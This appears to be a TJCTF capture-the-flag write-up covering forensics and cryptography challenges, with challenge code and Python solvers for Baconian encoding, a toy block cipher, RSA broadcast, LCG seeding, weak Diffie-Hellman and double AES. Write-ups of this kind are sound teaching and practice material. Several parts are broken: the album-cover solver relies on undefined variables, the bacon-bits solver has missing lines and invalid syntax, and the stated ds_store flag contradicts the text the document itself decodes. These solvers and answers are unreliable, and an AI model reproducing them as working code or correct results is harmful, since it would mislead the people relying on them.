niZvI6zZ8yzoSl17d963mQIlocblob 0wnNJd_pKKNtfhG-HL8i Ns2Tpp4fQxW5zhYLLGIVdAIlocblob NUhhZkAZsgdvPVVF3KzZpAIlocblob p7s4fwmK70UDkM_ApzmX3AIlocblob PgbanHSdf0H3qDXVUrVAaAIlocblob PGjsQh7wml99RXiA-gta6QIlocblob pJ_ampVpcIVGVZErPVONDQIlocblob pm_TeJmHmlL-5Mdv3R1YoAIlocblob pMOW9YUc2Zrd-6B5G3-NSQIlocblob Po5jOoQ4HUssvLHuCmDj5gIlocblob pOGlM0FXA5tvruLyZ5AVRAIlocblob pPd8nFycxgq3SD67StjdCQIlocblob PqYOp2_ps2oErxR5U5uSXAIlocblob PrceMk6k6v8-gPc6YUfuvQIlocblob prsJSTpQJJX5eKJQF3akDgIlocblob PuAZy-41HFCOsKTCZkwDBwIlocblob QJWXuKXCsnG2mjGYYbyoaAIlocblob QLpbpFhcDb2oapdj3YgutgIlocblob Qs13PznBoQJC9yjgWm-clQIlocblob QzopSLFcXVCF5sII8C8jJAIlocblob r4NAxKJ_RMhOLA468CAuLQIlocblob rhnhvlSsjRdNv35ZYwqSMgIlocblob rkFwpUQRoffUQmfnqKFCNgIlocblob sOcYOUIJIYjTYFNud5htCAIlocblob sPEu3qqkuJDSVB6LZ0x82wIlocblob tCSdwHZsNBvNS3h4qih6tAIlocblob TibD2LWT-7Xua5Wmivc-6AIlocblob TM0MhKzOCDKMYolGyoYc3gIlocblob TxlnTHhAAyM7wIn3PGdLEgIlocblob Ur4ktp41Mmf49_FANNugHQIlocblob uvIo5poX5D2dGKif1JiWIAIlocblob uXcTlwm5yaS69kQd0YlYgQIlocblob V2XHU0KaptQFjruBnOeYJwIlocblob V3JQfigsgWSgJ2bu8IuPOQIlocblob vNgO1oK2Ft-Q_OVtcjk7ogIlocblob VRU6bDaPkqPqFxsfBjrPQAIlocblob VVa_NUjLLaMsO2_Jwko-SAIlocblob w1oE_3GO5OTRADuEQ9PqnwIlocblob W62TUuIfC_ma91QdMu4ISAIlocblob wzeP722FHEtirWHFJrgP2AIlocblob xcTHd2ZbYtO9LQ2fmaQo1QIlocblob XfjqZgZvquXzdnfbcMKQMAIlocblob Xnji8EXzCRLmKJvoAkZftAIlocblob yfmS9_zOUIcxfSY-obWMhgIlocblob ylFen4T5uMeqvJC6p8dfkAIlocblob yx7GMqzc5YejMzOO5F087gIlocblob Z3cpkGAUMlLgzQctzCo2ZgIlocblob -FumtF3yx-kSP11OD8mFPAIlocblob 0wnNJd_pKKNtfhG-HL8iJwIlocblob 1VmhSaBo9ymK5dUhB3cPEQIlocblob 1zp7dw6eF3co0VaPDKhUagIlocblob 27bCy1Bt-9nnLG4W8oxkNAIlocblob 4vsxjPs-c9hBNmmaE8HJ8QIlocblob 5rc69mw3DNjUvLolTrP3ewIlocblob 6zed3-nVA008etbNxGTNEQIlocblob 78ICY1U_sI9qqF6vv97RhAIlocblob 7AJTVqVtlVelnulrRMUCaQIlocblob 7P7nopvmQj2usona47YjSAIlocblob 7v9Vn8ci1_C1tyjKpOrDjAIlocblob 9lZ0k-7YFRkQu1QhA-d-DAIlocblob _KxyLnw2LZxOc0Tk9U0cigIlocblob A69F-dk9M1nQFfzi06gLPwIlocblob abvFjWgNkHKQYbaMyCjdlwIlocblob AFEvM2adjTHq0E8noIE0kwIlocblob aNHzuom-c5UIGbW5ceGc9gIlocblob aNPc9lG0gpLnRvGI2JPQMAIlocblob aXNfdXNlZnVsP30gICAgIAIlocblob b-PeUWwmlHzmh613ikEFWwIlocblob b0HMxEHbs7pA9uHtxRPPTQIlocblob Bg9XKyNnYRSpUIYeK_2knAIlocblob CE4CzpPMjNHuYeLi2dLNHgIlocblob CPyvVdX_ynvUTdxXWYr7MwIlocblob D0FvxLGtoba2wKJQQEjUKAIlocblob D3LWCMzIQyc12SQUw5uDnwIlocblob DFhc0ROB762T-pZvtdPFqAIlocblob dGpjdGZ7ZHNfc3RvcmVfIAIlocblob dtiqv7O15HVT3k4aL1sTDAIlocblob Dwv-qkn0QQLu8RlhwUNNeAIlocblob e1xUP4GStK_lTs2W6gEkPAIlocblob E6IuP9ouzpQDYXSNNdSyFwIlocblob E8tEXrVCNAqQmSji8cDWqQIlocblob eNSX5RnqD95dCp7TNI2zOgIlocblob eSRLCk2xqnpx1htFqlBAvwIlocblob f0wkaX7NmMMATw1grKXIywIlocblob FsmKr0zCKawO9TVNgKkVvAIlocblob FxWYnzxWEHMQGNLR_7uXRwIlocblob g8azPwD-y-_2VU-dmRK7IAIlocblob GQxeqKQR4yLZIz889h8awQIlocblob iHFj7XDSIesD-TJ-aSiTyAIlocblob jg1spCuL4Vix9bgpToP5HgIlocblob JuARuIvr7ZvOOpeJ9LTOvAIlocblob kAbgNCWwQGUZWFktiIIHeAIlocblob kfAVM8pkh2jSSeuP0uWGogIlocblob LWUOeeOqK7mlQOTJmSmwVAIlocblob LxtZhpBRiU8PSE4eXQZV0wIlocblob meMIlojtiqbBuHOGDYud_QIlocblob mLO_JmXEG0tcWougAWQ6QwIlocblob MnbgbJqhwFXlh_kKGIYLJQIlocblob N3lsvxkjSRnwIfz3Z7C5uwIlocblob n8KZj1W3tx2WIXg8HqtF3gIlocblob aNHzuom-c5UIGbW5ceGc9gIlocblob aNPc9lG0gpLnRvGI2JPQMAIlocblob aXNfdXNlZnVsP30gICAgIAIlocblob b-PeUWwmlHzmh613ikEFWwIlocblob b0HMxEHbs7pA9uHtxRPPTQIlocblob Bg9XKyNnYRSpUIYeK_2knAIlocblob CE4CzpPMjNHuYeLi2dLNHgIlocblob CPyvVdX_ynvUTdxXWYr7MwIlocblob D0FvxLGtoba2wKJQQEjUKAIlocblob D3LWCMzIQyc12SQUw5uDnwIlocblob
```
its base64!!, after ten minutes of decode it, i finally found the exact part!

`solver.py`:
```py
import base64

b1 = "dGpjdGZ7ZHNfc3RvcmVfI"
b2 = "aXNfdXNlZnVsP30gICAgI"

combined = b1 + b2
missing_padding = len(combined) % 4
if missing_padding:
    combined += '=' * (4 - missing_padding)

decoded_bytes = base64.b64decode(combined)
print(decoded_bytes.decode(errors="ignore"))
```

Flag: `tjctf{ds_store_!}`

### album-cover

![](albumcover.png)

So we got 2 files, `albumcover.png` and encryptor

`enc.py`:
```py
import wave
from PIL import Image
import numpy as np
#sample_rate = 44100
with wave.open('flag.wav', 'rb') as w:
    frames = np.frombuffer(w.readframes(w.getnframes()), dtype=np.int16)
    print(w.getnframes())
    sampwidth = w.getsampwidth() # 2
    nchannels = w.getnchannels() # 1
    w.close()
arr = np.array(frames)
img = arr.reshape((441, 444))
img = (img + 32767) / 65535 * 255
img = img.astype(np.uint8)
img = Image.fromarray(img)
img = img.convert('L')
```
as you can see, the original file is `.wav`, the encryptor change it to `.png` file, all we can do is reverse it

`solver.py`:
```py
from PIL import Image
import numpy as np
import wave

img = Image.open('albumcover.png')
img_arr = np.array(img)
arr = img_arr.astype(np.float64)
arr = arr / 255.0
arr = arr * 65535.0
framerate = 44100 
nframes = len(frames)
comptype = "NONE"
compname = "not compressed"
with wave.open('flag_recovered.wav', 'wb') as w:
    w.setparams((nchannels, sampwidth, framerate, nframes, comptype, compname))       
    w.writeframes(frames.tobytes())
```
but if u play it, the audio is feels broken, so checked it with spectogram

![](albumcoverflag.png)

Flag: `tjctf{THIS-EASTER-EGG-IS-PRETTY-COOL}`

## Cryptography
### bacon-bits

![](baconbits.png)

So we got a `out.txt` and `enc.py`

`enc.py`:
```py
with open('flag.txt') as f: flag = f.read().strip()
with open('text.txt') as t: text = t.read().strip()

baconian = {
'a': '00000',   'b': '00001',
'c': '00010',   'd': '00011',
'e': '00100',   'f': '00101',
'g': '00110',   'h': '00111',
'i': '01000',    'j': '01000',
'k': '01001',    'l': '01010',
'm': '01011',    'n': '01100',
'o': '01101',    'p': '01110',
'q': '01111',    'r': '10000',
's': '10001',    't': '10010',
'u': '10011',    'v': '10011',
'w': '10100',   'x': '10101',
'y': '10110',   'z': '10111'}

text = [*text]
ciphertext = ""
for i,l in enumerate(flag):
    if not l.isalpha(): continue
    change = baconian[l]
    ciphertext += "".join([ts for ix, lt in enumerate(text[i*5:(i+1)*5]) if int(change[ix]) and (ts:=lt.upper()) or (ts:=lt.lower())]) #python lazy boolean evaluation + walrus operator

with open('out.txt', 'w') as e:
    e.write(''.join([chr(ord(i)-13) for i in ciphertext]))
```

`out.txt`:
```py
BaV8hcBaTg\`XG[8eXJTfT7h7hCBa4g<`Xg[8EXjTFTWHW8Ba6XHCbATG\`Xg;8eXj4fT7h78bAV8HcBa4G\@XG[XeXJ4fTWHWXBa68hCbA4g<`8G[8e8JTFT7hWXbA6XhcBaTG
```

So, the `enc.py` is implements a two-stage encryption process, first is `Baconian Cipher`, the flag's alphabetic char are converted into 5-bit binary strings. These bits then dictate the case of char in a cover text: `1` for uppercase and `0` for lowercase, then `Caesar Cipher`, the resulting mixed-case text is then obfuscated by subtracting 13 from the ordinal value of each char (a ROT-13 variant)

To solve it, we can just by reverse this process, first is reverse `Caesar Cipher` (add 13 to each char value to restore the mixed-case text), then extract binary, mapping uppercase letters to `1` and lowercase to `0` to rebuild the binary string, and decode bacoanian, group the binary string into 5-bit chunk and translate them to letters.

`solver.py`:
```py
baconian_decode_map = {
    '00000': 'a', '00001': 'b', '00010': 'c', '00011': 'd', '00100': 'e',
    '00101': 'f', '00110': 'g', '00111': 'h', '01000': 'i', '01001': 'k',
    '01010': 'l', '01011': 'm', '01100': 'n', '01101': 'o', '01110': 'p',
    '01111': 'q', '10000': 'r', '10001': 's', '10010': 't', '10011': 'u',
    '10100': 'w', '10101': 'x', '10110': 'y', '10111': 'z'
}

with open('out.txt', 'r') as f:
    for char in (chr(ord(c) + 13) for c in encrypted_content)
    if char.isalpha()
)

decoded_chars = "".join(
    baconian_decode_map[binary_string[i:i+5]]
    for i in range(0, len(binary_string), 5)
)

final_flag = f"tjctf{{{decoded_chars[5:]}}}"
print(final_flag)
```

Flag: `tjctf{oinkooinkoooinkooooink}`

### alchemist-recipe

![](alchemistrecipe.png)

So we got 2 file, `chall.py` and `encrypted.txt`

`chall.py`:
```py
import hashlib

SNEEZE_FORK = "AurumPotabileEtChymicumSecretum"
WUMBLE_BAG = 8

def glorbulate_sprockets_for_bamboozle(blorbo):
    zing = {}
    yarp = hashlib.sha256(blorbo.encode()).digest()
    zing['flibber'] = list(yarp[:WUMBLE_BAG])
    zing['twizzle'] = list(yarp[WUMBLE_BAG:WUMBLE_BAG+16])
    glimbo = list(yarp[WUMBLE_BAG+16:])
    snorb = list(range(256))
    sploop = 0
    for _ in range(256):
        for z in glimbo:
            wob = (sploop + z) % 256
            snorb[sploop], snorb[wob] = snorb[wob], snorb[sploop]
            sploop = (sploop + 1) % 256
    zing['drizzle'] = snorb
    return zing

def scrungle_crank(dingus, sprockets):
    if len(dingus) != WUMBLE_BAG:
        raise ValueError(f"Must be {WUMBLE_BAG} wumps for crankshaft.")
    zonked = bytes([sprockets['drizzle'][x] for x in dingus])
    quix = sprockets['twizzle']
    splatted = bytes([zonked[i] ^ quix[i % len(quix)] for i in range(WUMBLE_BAG)])    
    wiggle = sprockets['flibber']
    waggly = sorted([(wiggle[i], i) for i in range(WUMBLE_BAG)])
    zort = [oof for _, oof in waggly]
    plunk = [0] * WUMBLE_BAG
    for y in range(WUMBLE_BAG):
        x = zort[y]
        plunk[y] = splatted[x]
    return bytes(plunk)

def snizzle_bytegum(bubbles, jellybean):
    fuzz = WUMBLE_BAG - (len(bubbles) % WUMBLE_BAG)
    if fuzz == 0:
        fuzz = WUMBLE_BAG
    bubbles += bytes([fuzz] * fuzz)
    glomp = b""
    for b in range(0, len(bubbles), WUMBLE_BAG):
        splinter = bubbles[b:b+WUMBLE_BAG]
        zap = scrungle_crank(splinter, jellybean)
        glomp += zap
    return glomp

def main():
    try:
        with open("flag.txt", "rb") as f:
            flag_content = f.read().strip()
    except FileNotFoundError:
        print("Error: flag.txt not found. Create it with the flag content.")
        return

    if not flag_content:
        print("Error: flag.txt is empty.")
        return

    print(f"Original Recipe (for generation only): {flag_content.decode(errors='ignore')}")

    jellybean = glorbulate_sprockets_for_bamboozle(SNEEZE_FORK)
    encrypted_recipe = snizzle_bytegum(flag_content, jellybean)

    with open("encrypted.txt", "w") as f_out:
        f_out.write(encrypted_recipe.hex())

    print(f"\nEncrypted recipe written to encrypted.txt:")
    print(encrypted_recipe.hex())

if __name__ == "__main__":
    main()
```

`encrypted.txt`:
```txt
b80854d7b5920901192ea91ccd9f588686d69684ec70583abe46f6747e940c027bdeaa848ecb316e11d9a99c7e87b09e
```

`chall.py` implements a custom 8-byte block cipher, it encrypts in an ECB, where each block is processed independently, the enc key `jellybean` is generated from the SHA256 hash of the string `AurumPotabileEtChymicumSecretum`

`scrungle_crank` function involves three steps of encryption,
1. Substitution: Each byte of the plaintext block is replaced with a value from a key-dependent substitution box (S-box) named `drizzle`

2. XOR: The result is XORed against a 16-byte key named `twizzle`

3. ermutation: The bytes of the XORed block are reordered based on the sorted order of an 8-byte key named `flibber`

To solve it, we can reverse the encryption process, first inverse permutation (revert the byte reordering), then inverse XOR (XOR the block with the same `twizzle` key, as XOR is its own inverse), after that inverse substitution (use an inverted S-box to map the subtituted bytes back)

`solver.py`:
```py
import hashlib

SNEEZE_FORK = "AurumPotabileEtChymicumSecretum"
WUMBLE_BAG = 8

def glorbulate_sprockets_for_bamboozle(blorbo):
    zing = {}
    yarp = hashlib.sha256(blorbo.encode()).digest()
    zing['flibber'] = list(yarp[:WUMBLE_BAG]) 
    zing['twizzle'] = list(yarp[WUMBLE_BAG:WUMBLE_BAG+16])
    glimbo = list(yarp[WUMBLE_BAG+16:])       
    snorb = list(range(256))
    sploop = 0
    for _ in range(256):
        for z in glimbo:
            wob = (sploop + z) % 256
            snorb[sploop], snorb[wob] = snorb[wob], snorb[sploop]
            sploop = (sploop + 1) % 256       
    zing['drizzle'] = snorb
    return zing

def reverse_scrungle_crank(block, sprockets): 
    wiggle = sprockets['flibber']
    perm_map = [old_idx for val, old_idx in sorted([(wiggle[i], i) for i in range(WUMBLE_BAG)])]
    unpermuted = [0] * WUMBLE_BAG
    for i in range(WUMBLE_BAG):
        unpermuted[perm_map[i]] = block[i]    

    twizzle = sprockets['twizzle']
    unxored = bytes([unpermuted[i] ^ twizzle[i % len(twizzle)] for i in range(WUMBLE_BAG)]) 

    drizzle = sprockets['drizzle']
    inv_drizzle = [0] * 256
    for i in range(256):
        inv_drizzle[drizzle[i]] = i

    original_block = bytes([inv_drizzle[x] for x in unxored])
    return original_block

def reverse_snizzle_bytegum(ciphertext, jellybean):
    decrypted_padded = b""
    for i in range(0, len(ciphertext), WUMBLE_BAG):
        block = ciphertext[i:i+WUMBLE_BAG]    
        decrypted_padded += reverse_scrungle_crank(block, jellybean)

    pad_len = decrypted_padded[-1]
    return decrypted_padded[:-pad_len]        

def main():
    with open("encrypted.txt", "r") as f:     
        encrypted_hex = f.read().strip()      

    encrypted_bytes = bytes.fromhex(encrypted_hex)

    jellybean = glorbulate_sprockets_for_bamboozle(SNEEZE_FORK)

    flag = reverse_snizzle_bytegum(encrypted_bytes, jellybean)

    print(flag.decode())


if __name__ == "__main__":
    main()
```

Flag: `tjctf{thank_you_for_making_me_normal_again_yay}`

### theartofwar

![](theartofwar.png)

So we got 2 file, `output.txt` and `main.py`

`main.py`:
```py
from Crypto.Util.number import bytes_to_long, getPrime, long_to_bytes
import time


flag = open('flag.txt', 'rb').read()
m = bytes_to_long(flag)

e = getPrime(8)
print(f'e = {e}')

def generate_key():
    p, q = getPrime(256), getPrime(256)
    while (p - 1) % e == 0:
        p = getPrime(256)
    while (q - 1) % e == 0:
        q = getPrime(256)
    return p * q

for i in range(e):
    n = generate_key()
    c = pow(m, e, n)
    print(f'n{i} = {n}')
    print(f'c{i} = {c}')
```
`output.txt`:
```py
❯ cat output.txt
e = 229
n0 = 4133000467509364935031235422549250721944804102635126859171287340663853905144304279207722105302316322260373188441296903081565640870622284840397538002237331
c0 = 3948516562901221579319242054999926100356598986131508069290749654122146258185357479755195245759062508504409839795634616384594556630261405196176415874727674
n1 = 10012310178440378644460341473165848881968550265291067580300168032729328228000061345651296737301058801752166581806744841746261097249355596503846722347988833
c1 = 7203369362959462243170744698257523975344935146787494714580742042030559300473546901912861737948713816740624292361174535303284449900823238173178576198697775
...
...
...
...
...
...
n228 = 8436105266779215397600464028220244463194349609028479668519755739586774034522217632224615906136235170783922483076839235183125889204826283386865406369080437
c228 = 89900466013784478553210494829116144898476776253278000711433633982268352924632956071541960485866929379189727059518179434642644257558019991914076483483
```

the `main.py`, it reads a `flag` message and converts it to an int `m`. It also generates a small prime public exponent `e`, also there is multiple ecryptions, it loops `e` times, in each loop it generates a new unique RSA modulus `n_i` and uses it to encrypt the same message `m` with the public exponent `e`, then the output process results in `e` different ciphertexts (`c_i`) and their corresponding moduli (`n_i`). Each spair satifies the congruence:
$$
C_i = m^e (mod n_i)
$$
to recover, we can use `Chinese Reminder Theorem`, it applies to the system of congruences. The CRT solves for a single value, lets call it `M`, that satifies all the conditions simultanenously

`solver.py`:
```py
from Crypto.Util.number import long_to_bytes, inverse
from sympy import integer_nthroot

lines = open('output.txt').read().strip().splitlines()
e = int(lines[0].split('=')[1].strip())

ns = []
cs = []
for i in range(1, len(lines), 2):
    n = int(lines[i].split('=')[1].strip())
    c = int(lines[i+1].split('=')[1].strip())
    ns.append(n)
    cs.append(c)

from functools import reduce

def crt(cs, ns):
    N = reduce(lambda x, y: x * y, ns)
    result = 0
    for c, n in zip(cs, ns):
        Ni = N // n
        inv = inverse(Ni, n)
        result += c * Ni * inv
    return result % N

M = crt(cs, ns)
m, exact = integer_nthroot(M, e)
assert exact, "Root not exact, something went wrong"
print(long_to_bytes(m))
```

Flag: `tjctf{the_greatest_victory_is_that_which_require_no_battle}`

### seeds

![](seeds.png)

So we got a file called `main.py`

`main.py`:
```py
import time, sys, select
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

class RandomGenerator:
    def __init__(self, seed = None, modulus = 2 ** 32, multiplier = 157, increment = 1):    
        if seed is None:
            seed = time.asctime()
        if type(seed) is int:
            self.seed = seed
        if type(seed) is str:
            self.seed = int.from_bytes(seed.encode(), "big")
        if type(seed) is bytes:
            self.seed = int.from_bytes(seed, "big")
        self.m = modulus
        self.a = multiplier
        self.c = increment

    def randint(self, bits: int):
        self.seed = (self.a * self.seed + self.c) % self.m
        result = self.seed.to_bytes(4, "big") 
        while len(result) < bits // 8:        
            self.seed = (self.a * self.seed + self.c) % self.m
            result += self.seed.to_bytes(4, "big")
        return int.from_bytes(result, "big") % (2 ** bits)

    def randbytes(self, len: int):
        return self.randint(len * 8).to_bytes(len, "big")

def input_with_timeout(prompt, timeout=10):   
    sys.stdout.write(prompt)
    sys.stdout.flush()
    ready, _, _ = select.select([sys.stdin], [], [], timeout)
    if ready:
        return sys.stdin.buffer.readline().rstrip(b'\n')
    raise Exception

def main():
    print("Welcome to the AES Oracle")        

    randgen = RandomGenerator()
    cipher = AES.new(randgen.randbytes(32), AES.MODE_ECB)
    flag = open("flag.txt", "rb").read()      

    ciphertext = cipher.encrypt(pad(flag, AES.block_size))
    print(f'{ciphertext = }')

    while True:
        plaintext = input_with_timeout("What would you like to encrypt? (enter 'quit' to exit) ")
        if plaintext == b"quit": break        
        cipher = AES.new(randgen.randbytes(32), AES.MODE_ECB)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        print(f"{ciphertext = }")



if __name__ == "__main__":
    main()
```
 `main.py` has vuln, first is weak PRNG, the script uses a custom `RandomGenerator` class, which is a simple Linear Congruential Generator (LCG), also predicatble seed, and for the key gen process, first it generates 32-byte key to encrypt the flag, second it, generates a new 32-byte key to encrypt and data the user provides, since the entire key sequence is determined by the initial seed time, finding the seed allows the attacker to regenerate both keys.

 To solve it, we can brute force the seed time, as same as `RandomGenerator` using the guessed time as the seed

`solver.py`:
```py
#!/usr/bin/env python3

import time
import sys
import select
import datetime
import pytz
import re
import ast 
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class RandomGenerator:
    def __init__(self, seed = None, modulus = 2 ** 32, multiplier = 157, increment = 1):
        if seed is None:
            seed = time.asctime()
        if type(seed) is int:
            self.seed = seed
        if type(seed) is str:
            self.seed = int.from_bytes(seed.encode(), "big")
        if type(seed) is bytes:
            self.seed = int.from_bytes(seed, "big")
        self.m = modulus
        self.a = multiplier
        self.c = increment

    def randint(self, bits: int):
        self.seed = (self.a * self.seed + self.c) % self.m
        result = self.seed.to_bytes(4, "big")
        while len(result) < bits // 8:
            self.seed = (self.a * self.seed + self.c) % self.m
            result += self.seed.to_bytes(4, "big")
        return int.from_bytes(result, "big") % (2 ** bits)

    def randbytes(self, length: int):
        return self.randint(length * 8).to_bytes(length, "big")

def format_asctime_like(dt_obj):
    day_str = str(dt_obj.day)
    return dt_obj.strftime(f'%a %b {day_str:>2} %H:%M:%S %Y')

def parse_ciphertext(line: bytes) -> bytes:
    repr_string = line.strip().decode()
    return ast.literal_eval(repr_string)

def solve():
    HOST = "tjc.tf"
    PORT = 31493

    io = remote(HOST, PORT)
    server_tz = pytz.timezone('America/New_York')
    connect_time = datetime.datetime.now(server_tz)
    log.info(f"Waktu koneksi (ET): {connect_time.strftime('%Y-%m-%d %H:%M:%S')}")     

    io.recvuntil(b"ciphertext = ")
    flag_ciphertext_line = io.recvline()
    flag_ciphertext = parse_ciphertext(flag_ciphertext_line)
    log.info(f"Ciphertext Bendera (hex): {flag_ciphertext.hex()}")
    probe_plaintext = b"a" * 16
    io.sendlineafter(b"What would you like to encrypt? (enter 'quit' to exit) ", probe_plaintext)
    io.recvuntil(b"ciphertext = ")
    probe_ciphertext_line = io.recvline()
    probe_ciphertext = parse_ciphertext(probe_ciphertext_line)
    io.close()
    for i in range(-10, 5):
        guess_time = connect_time + datetime.timedelta(seconds=i)
        seed_str = format_asctime_like(guess_time)

        randgen_guess = RandomGenerator(seed=seed_str)
        _ = randgen_guess.randbytes(32)
        probe_key_guess = randgen_guess.randbytes(32)

        cipher_guess = AES.new(probe_key_guess, AES.MODE_ECB)
        encrypted_probe_guess = cipher_guess.encrypt(pad(probe_plaintext, AES.block_size))

        if encrypted_probe_guess == probe_ciphertext:
            log.success(f"Seed waktu yang benar ditemukan: '{seed_str}'")
            randgen_correct = RandomGenerator(seed=seed_str)
            flag_key = randgen_correct.randbytes(32)
            log.info(f"Kunci bendera yang direkonstruksi: {flag_key.hex()}")

            decipher = AES.new(flag_key, AES.MODE_ECB)
            decrypted_flag_padded = decipher.decrypt(flag_ciphertext)

            flag = unpad(decrypted_flag_padded, AES.block_size)
            log.success(f"FLAG: {flag.decode()}")
            return

    log.failure("Gagal menemukan seed yang benar. Coba jalankan lagi atau perlebar rentang waktu.")

if __name__ == "__main__":
    solve()
```

Flag: `the netcat already down`

### close-secrets

![](closesecrets.png)

So we got 3 files, `params.txt`, `enc_flag`, and `encrypt.py`

`encrypt.py`:
```py
import random
from random import randint
import sys
from Crypto.Util import number
import hashlib 

def encrypt_outer(plaintext_ords, key):
    cipher = []
    key_offset = key % 256
    for val in plaintext_ords:
        if not isinstance(val, int):
            raise TypeError
        cipher.append((val + key_offset) * key)
    return cipher

def dynamic_xor_encrypt(plaintext_bytes, text_key_bytes):
    encrypted_ords = []
    key_length = len(text_key_bytes)
    if not isinstance(plaintext_bytes, bytes):
        raise TypeError
    for i, byte_val in enumerate(plaintext_bytes[::-1]):
        key_byte = text_key_bytes[i % key_length]
        encrypted_ords.append(byte_val ^ key_byte)
    return encrypted_ords

def generate_dh_key():
    p = number.getPrime(1024)
    g = number.getPrime(1024)
    a = randint(p - 10, p)
    b = randint(g - 10, g)
    u = pow(g, a, p)
    v = pow(g, b, p)
    key = pow(v, a, p)
    b_key = pow(u, b, p)
    if key != b_key:
        sys.exit(1)
    return p, g, u, v, key

def generate_challenge_files(flag_file="flag.txt", params_out="params.txt", enc_flag_out="enc_flag"):
    try:
        with open(flag_file, "r") as f:
            flag_plaintext = f.read().strip()
    except FileNotFoundError:
        sys.exit(1)
    flag_bytes = flag_plaintext.encode('utf-8')
    p, g, u, v, shared_key = generate_dh_key()
    xor_key_str = hashlib.sha256(str(shared_key).encode()).hexdigest()
    xor_key_bytes = xor_key_str.encode('utf-8')
    intermediate_ords = dynamic_xor_encrypt(flag_bytes, xor_key_bytes)
    final_cipher = encrypt_outer(intermediate_ords, shared_key)
    with open(params_out, "w") as f:
        f.write(f"p = {p}\n")
        f.write(f"g = {g}\n")
        f.write(f"u = {u}\n")
        f.write(f"v = {v}\n")
    with open(enc_flag_out, "w") as f:
        f.write(str(final_cipher))

if __name__ == "__main__":
    try:
        with open("flag.txt", "x") as f:
            f.write("tjctf{d3f4ult_fl4g_f0r_t3st1ng}")
    except FileExistsError:
        pass
    generate_challenge_files()
```

So, this chall uses a two-layer custom encryption scheme based on a Diffie-Hellman key exchange. The vuln lies in the gen of the private keys, `a` and `b`.

The `generate_dh_key` function selects the private key `a` from an extremely small range:
```py
a = randint(p - 10, p)
```
Since `p` is public param, we know that `a` must be one of only 11 possible values, this makes it trivial to brute force the private key `a`, once `a` is known, we can calculate the shared secret key and reverse the two encryption layers 

To solve it, we can brute forcing the private key `a`, with param `p`, `g`, `u`, and `v` from `params.txt`. With these we can find `a` by checking which of the 11 possible values satifies the equation $u = g^a (mod p)$
```py
# The range for 'a' is very small (p-10 to p)
for test_a in range(p - 10, p + 1):
    if pow(g, test_a, p) == u:
        found_a = test_a
        break
```
after that, calculating the shared secret, with the correct `a` and the public value `v`, we can compute the Diffie-Hellman shared secret key
```py
# shared_key = (v^a) mod p
shared_key = pow(v, found_a, p)
```
the last, reversing the enc layers, we can simply reverse two enc func in the opposite order. The original function calculates `cipher = (val + key_offset) * shared_key`. We reverse this with simple algebra: `val = (cipher // shared_key) - key_offset, where key_offset is shared_key % 256`. And for the Inner layers, the original function performs a repeating-key XOR on the reversed flag bytes. We first regenerate the same XOR key by hashing the `shared_key`. Then, we apply the XOR operation again to the intermediate data, which decrypts it.

`solver.py`:
```py
import hashlib
import ast

def solve():
    try:
        with open("params.txt", "r") as f:
            lines = f.readlines()
            p = int(lines[0].strip().split(" = ")[1])
            g = int(lines[1].strip().split(" = ")[1])
            u = int(lines[2].strip().split(" = ")[1])
            v = int(lines[3].strip().split(" = ")[1])

        with open("enc_flag", "r") as f:
            final_cipher = ast.literal_eval(f.read())
    except FileNotFoundError as e:
        print(f"Error: Make sure '{e.filename}' is in the same directory.")
        return

    found_a = None
    for test_a in range(p - 10, p + 1):
        if pow(g, test_a, p) == u:
            found_a = test_a
            break

    if found_a is None:
        return

    shared_key = pow(v, found_a, p)
    key_offset = shared_key % 256
    intermediate_ords = []
    for val in final_cipher:
        decrypted_val = (val // shared_key) - key_offset
        intermediate_ords.append(decrypted_val)
    xor_key_str = hashlib.sha256(str(shared_key).encode()).hexdigest()
    xor_key_bytes = xor_key_str.encode('utf-8')
    key_length = len(xor_key_bytes)
    decrypted_reversed_ords = []
    for i, byte_val in enumerate(intermediate_ords):
        key_byte = xor_key_bytes[i % key_length]
        decrypted_reversed_ords.append(byte_val ^ key_byte)
    try:
        flag_bytes = bytes(decrypted_reversed_ords[::-1])
        flag = flag_bytes.decode('utf-8')
        print(f"   Flag: {flag}")
    except (UnicodeDecodeError, TypeError) as e:
        print(f"[!] Failed to decode the final flag bytes: {e}")
        print(f"    Raw bytes: {flag_bytes}")

if __name__ == "__main__":
    solve()
```

Flag: `tjctf{sm4ll_r4ng3_sh0rt_s3cr3t}`

### double-trouble

![](doubletrouble.png)

So we got 2 files, `out.txt` and `enc.py`

`enc.py`:
```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import random

def gen():
    myrandom = random.Random(42)
    k1 = myrandom.randbytes(8)
    choices = list(myrandom.randbytes(6))
    k2 = b''
    for _ in range(8):
        k2 += bytes([choices[random.randint(0, 3)]])
    return k1, k2

def enc(data, k1, k2,  k3, k4):
    key1 = k1+k2
    cipher = AES.new(key1, mode=AES.MODE_ECB)
    ct1 = cipher.encrypt(pad(data, 16))
    key2 = k4+k3
    cipher = AES.new(key2, mode=AES.MODE_ECB)
    ct2 = cipher.encrypt(ct1)
    return ct2

k1, k2 = gen()
k3, k4 = gen()

pt = b"example"

with open('flag.txt') as f:
    flag = f.read().encode()

with open('out.txt', "w") as f:
    f.write(enc(pt, k1, k2, k3, k4).hex())
    f.write("\n")
    f.write(enc(flag, k1, k2, k3, k4).hex())
```
`out.txt`:
```txt
7125383e330c692c75e0ee0886ec7779
9ecba853742db726fb39e748a0c5cfd06b682c8f15be13bc8ba2b2304897eca2
```

The `enc.py` implements a double AES encryption scheme:\
`ciphertext = AES_ECB(key2, AES_ECB(key1, plaintext))`

This structure is a classic candidate for a Meet-in-the-Middle (MITM) attack. The main vulnerability, however, lies in the `gen()` function responsible for creating the keys

1. Fixed seed, The random number generator is seeded with a constant, `random.Random(42)`. This means the "random" values it produces are completely deterministic and can be reproduced

2. Tiny Key Space, The keys `k2` and `k4` are each constructed from 8 bytes. Each byte is chosen from a pool of just 4 possible bytes (derived from the seeded PRNG). This reduces the search space for each 8-byte key part from an impossible number to a trivial $$4^8=65,536$$ possibilities

3. Key Duplication, Since `gen()` is called twice with the same underlying logic, `k1` and `k3` are identical, as is the pool of bytes used to generate `k2` and `k4`

To solve it, we need:

1. we work forward from the known plaintext. We iterate through all 65,536 possibilities for the key part `k2`. For each `k2`, we construct the full first key `(key1 = k1 + k2)` and encrypt the known plaintext. The result is an intermediate ciphertext.

We store these results in a lookup table that maps the intermediate ciphertext to the k2 that produced it.\
